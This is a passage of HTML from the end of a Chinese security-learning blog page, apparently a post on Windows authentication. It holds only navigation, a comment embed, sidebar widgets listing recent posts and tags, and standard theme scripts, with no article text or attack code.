alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/10/05/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Kerberos认证学习</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/"><span class="level-item">春秋云镜-Brute4Road靶场</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
+            this.page.url = 'https://1vxyz.github.io/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/';
+            this.page.identifier = '2023/09/25/第二章-Windows认证机制和协议/';
+        };
+        (function() {
+            var d = document, s = d.createElement('script');  
+            s.src = '//' + 'shortname' + '.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="1vxyz"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">1vxyz</p><p class="is-size-6 is-block">什么都想学 什么都学不会</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">24</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">10</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1vxyz" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/1vxyz"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-10-10T02:04:20.000Z">2023-10-10</time></p><p class="title"><a href="/2023/10/10/%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2/">免杀初探</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-10-06T13:16:47.000Z">2023-10-06</time></p><p class="title"><a href="/2023/10/06/Kerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/">Kerberos协议漏洞攻击</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-10-05T09:08:10.000Z">2023-10-05</time></p><p class="title"><a href="/2023/10/05/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/">Kerberos认证学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-09-25T07:56:19.000Z">2023-09-25</time></p><p class="title"><a href="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/">第二章-Windows认证机制和协议</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-09-20T12:02:57.000Z">2023-09-20</time></p><p class="title"><a href="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/">春秋云镜-Brute4Road靶场</a></p></div></article></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF%E6%AF%94%E8%B5%9Bwp/"><span class="tag">CTF比赛wp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java%E5%AE%89%E5%85%A8/"><span class="tag">java安全</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%85%8D%E6%9D%80/"><span class="tag">免杀</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tag">内网渗透</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/"><span class="tag">内网靶场</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7/"><span class="tag">工具</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8F%90%E6%9D%83/"><span class="tag">提权</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="tag">漏洞复现</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><span class="tag">环境配置</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"><span class="tag">电子取证</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.cnblogs.com/BUTLER/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">BUTLER</span></span><span class="level-right"><span class="level-item tag">www.cnblogs.com</span></span></a></li><li><a class="level is-mobile" href="http://cxkjy.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">帅哥</span></span><span class="level-right"><span class="level-item tag">cxkjy.github.io</span></span></a></li><li><a class="level is-mobile" href="https://blog.csdn.net/weixin_61154173?type=blog" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">zxkling</span></span><span class="level-right"><span class="level-item tag">blog.csdn.net</span></span></a></li><li><a class="level is-mobile" href="https://v2ish1yan.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">v2ish1yan</span></span><span class="level-right"><span class="level-item tag">v2ish1yan.github.io</span></span></a></li><li><a class="level is-mobile" href="https://blog.csdn.net/weixin_63231007?type=blog" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CSDN</span></span><span class="level-right"><span class="level-item tag">blog.csdn.net</span></span></a></li></ul></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.jpg" alt="≧▽≦" height="28"></a><p class="is-size-7"><span>&copy; 2023 1vxyz</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">🐾🐾🐾</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
